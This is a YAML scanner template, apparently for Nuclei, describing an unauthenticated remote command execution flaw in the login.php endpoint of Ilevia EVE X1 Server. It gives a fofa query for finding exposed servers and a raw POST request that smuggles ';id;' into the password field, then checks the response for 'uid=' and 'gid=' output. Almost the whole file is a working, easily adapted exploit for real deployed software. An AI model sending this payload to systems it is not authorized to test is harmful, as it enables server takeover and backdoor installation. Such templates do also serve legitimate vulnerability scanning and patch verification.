id: Ilevia-EVE-X1-Server-login_php-RCE

info:
  name: Ilevia EVE X1 Server login.php 远程命令执行漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="ilevia-EVE-X1-Server"
    Ilevia EVE X1 Server login.php接口存在远程命令执行漏洞,未经身份攻击者可通过该漏洞在服务器端任意执行代码,写入后门,获取服务器权限,进而控制整个 web 服务器。该漏洞利用难度较低，建议受影响的用户尽快修复。
  reference:
    - https://mp.weixin.qq.com/s/gX41gGKxm3xv5Y-SpoPx8g
  tags: RCE

http:
  - raw:
      - |
        POST /ajax/php/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        userid=george&passwd=;id;
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
        condition: and
      - type: status
        status: 
          - 200